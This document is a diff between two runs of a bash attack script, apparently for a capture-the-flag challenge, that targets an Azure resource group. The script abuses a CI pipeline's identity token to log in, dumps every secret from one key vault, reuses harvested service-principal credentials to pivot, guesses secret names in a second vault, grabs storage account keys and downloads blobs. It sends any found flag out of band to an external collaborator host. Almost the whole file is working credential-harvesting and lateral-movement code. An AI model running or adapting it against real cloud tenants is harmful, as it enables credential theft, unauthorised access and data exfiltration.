@@ -1,10 +1,11 @@
 #!/usr/bin/env bash
-# Tebamoto Logistics - step 5, run 4.
-# Fixes run 3: cache all source-vault secrets WHILE still federated (changing identity
-# loses read access to the source vault), and stop swallowing stderr on blob listing.
+# Tebamoto Logistics - step 5, run 5.
+# Run 4 showed: all 6 principals authenticate but are denied LIST on kv-tbl-sec-x3euoz,
+# and the federated identity sees containers (control plane) but is denied blob access
+# (data plane). So: (a) try every principal against storage, especially the 'loot'
+# container, and (b) try secret GET with guessed names - list-denied often still allows get.
 #
-# Read-only, scoped to rg-tbl-platform-prod-sea. No secret value is ever echoed:
-# the public Actions log gets names/lengths/match only, and only the flag goes OOB.
+# Read-only, scoped to rg-tbl-platform-prod-sea. No secret value echoed; flag goes OOB only.
 set -uo pipefail
 
 COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
@@ -14,13 +15,15 @@ TGT_VAULT="kv-tbl-sec-x3euoz"
 FLAGRE='DF26\{[^}]+\}'
 FOUND=""
 WORK=$(mktemp -d)
+GUESS="flag FLAG ctf-flag challenge-flag tebamoto-flag final-flag df26 DF26 flag1 the-flag
+secret admin-password root-password master-key breach-notes incident-notes loot exfil
+storefront-flag platform-flag prod-flag tbl-flag answer solution"
 
 say() { echo "[*] $*"; }
-note() { M=$(grep -oE "$FLAGRE" <<<"$1" | head -1); [ -n "$M" ] && FOUND="$M"; echo "${M:+MATCH}${M:--}"; }
+note() { local m; m=$(grep -oE "$FLAGRE" <<<"$1" | head -1); [ -n "$m" ] && FOUND="$m"; echo "${m:+MATCH}${m:--}"; }
 
 federate() {
-  local t
-  t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+  local t; t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
       "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
   [ -z "$t" ] && return 1
   az logout >/dev/null 2>&1
@@ -28,72 +31,66 @@ federate() {
     --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
 }
 
-federate && say "federated login OK" || { say "federated login FAILED"; exit 1; }
+# try every guessed secret name in TGT_VAULT under the current identity
+try_gets() {
+  local who="$1" hit=0
+  for G in $GUESS; do
+    V=$(az keyvault secret show --vault-name "$TGT_VAULT" --name "$G" --query value -o tsv 2>/dev/null)
+    [ -z "$V" ] && continue
+    hit=1; say "      GET ok: $G len=${#V} flag=$(note "$V")"
+    [ -n "$FOUND" ] && return 0
+  done
+  [ $hit -eq 0 ] && say "      no guessed name readable"
+  return 0
+}
 
-# ------------------------------------------------- 1. cache principals up front
-say "=== caching principals from $SRC_VAULT (values never printed) ==="
-N=0
-for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
-  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
-  if [ -s "$WORK/$S" ]; then
-    say "  cached $S (len=$(wc -c <"$WORK/$S"), keys=$(jq -r 'keys|join(",")' <"$WORK/$S" 2>/dev/null))"
-    N=$((N+1))
-  else
-    say "  $S unreadable"
-  fi
-done
-say "cached $N principal(s)"
-
-# ------------------------------------------------- 2. storage, both auth modes
-say "=== storage blobs ==="
-for A in $(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null); do
-  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
-  if [ ${#K} -ge 40 ]; then AUTH=(--account-key "$K"); MODE=key; else AUTH=(--auth-mode login); MODE=aad; fi
-  CL=$(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>&1)
-  say "  account=$A auth=$MODE containers=$(tr '\n' ' ' <<<"$CL" | head -c 120)"
-  grep -qiE 'error|denied|forbidden' <<<"$CL" && continue
-  for C in $CL; do
-    BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
-    if grep -qiE 'error|denied|forbidden' <<<"$BL"; then
-      say "    $C -> list failed: $(head -c 140 <<<"$BL" | tr -d '\n')"
-      continue
-    fi
-    for B in $BL; do
-      D=$(az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
-          --file /dev/stdout -o none 2>/dev/null)
-      say "    blob=$C/$B len=${#D} flag=$(note "$D")"
+# try all storage data-plane access under the current identity
+try_storage() {
+  local who="$1"
+  for A in $(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null); do
+    K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
+    if [ ${#K} -ge 40 ]; then AUTH=(--account-key "$K"); M=key; else AUTH=(--auth-mode login); M=aad; fi
+    for C in $(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>/dev/null); do
+      BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
+      grep -qiE 'error|denied|forbidden|permission' <<<"$BL" && continue
+      say "      $A/$C readable via $M: $(tr '\n' ' ' <<<"$BL" | head -c 150)"
+      for B in $BL; do
+        D=$(az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
+            --file /dev/stdout -o none 2>/dev/null)
+        say "        blob=$B len=${#D} flag=$(note "$D")"
+        [ -n "$FOUND" ] && return 0
+      done
     done
   done
+  return 0
+}
+
+federate && say "federated login OK" || { say "federated FAILED"; exit 1; }
+
+say "=== caching principals ==="
+for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
+  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
 done
+say "cached $(ls -1 "$WORK" | wc -l)"
 
-# ------------------------------------------------- 3. pivot through each principal
-say "=== pivot -> $TGT_VAULT ==="
-for F in "$WORK"/*; do
-  [ -s "$F" ] || continue
-  S=$(basename "$F")
-  CID=$(jq -r '.clientId // .appId // .client_id // empty' <"$F" 2>/dev/null)
-  SEC=$(jq -r '.clientSecret // .password // .client_secret // empty' <"$F" 2>/dev/null)
-  TEN=$(jq -r '.tenantId // .tenant // .tenant_id // empty' <"$F" 2>/dev/null)
-  [ -z "$CID" ] && { say "  $S -> no clientId field"; continue; }
+say "=== federated identity: guessed GETs + storage ==="
+try_gets "federated"; [ -z "$FOUND" ] && try_storage "federated"
 
-  az logout >/dev/null 2>&1
-  if ! az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
-        --allow-no-subscriptions >/dev/null 2>&1; then
-    say "  $S (${CID:0:8}…) -> login failed"; continue
-  fi
-  LIST=$(az keyvault secret list --vault-name "$TGT_VAULT" --query "[].name" -o tsv 2>&1)
-  if grep -qiE 'forbidden|not authorized|error' <<<"$LIST"; then
-    say "  $S (${CID:0:8}…) -> denied"; continue
-  fi
-  say "  $S (${CID:0:8}…) -> UNLOCKED"
-  for T in $LIST; do
-    V=$(az keyvault secret show --vault-name "$TGT_VAULT" --name "$T" --query value -o tsv 2>/dev/null)
-    say "      secret=$T len=${#V} flag=$(note "$V")"
+if [ -z "$FOUND" ]; then
+  for F in "$WORK"/*; do
+    [ -s "$F" ] || continue
+    S=$(basename "$F")
+    CID=$(jq -r '.appId // .clientId // empty' <"$F"); SEC=$(jq -r '.clientSecret // empty' <"$F")
+    TEN=$(jq -r '.tenantId // empty' <"$F")
+    az logout >/dev/null 2>&1
+    az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
+      --allow-no-subscriptions >/dev/null 2>&1 || { say "  $S -> login failed"; continue; }
+    say "  --- as $S (${CID:0:8}…)"
+    try_gets "$S";  [ -n "$FOUND" ] && break
+    try_storage "$S"; [ -n "$FOUND" ] && break
   done
-  [ -n "$FOUND" ] && break
-done
+fi
 
-# ------------------------------------------------- 4. report
 rm -rf "$WORK"
 if [ -n "$FOUND" ]; then
   say "FLAG FOUND (${#FOUND} chars) - OOB only"
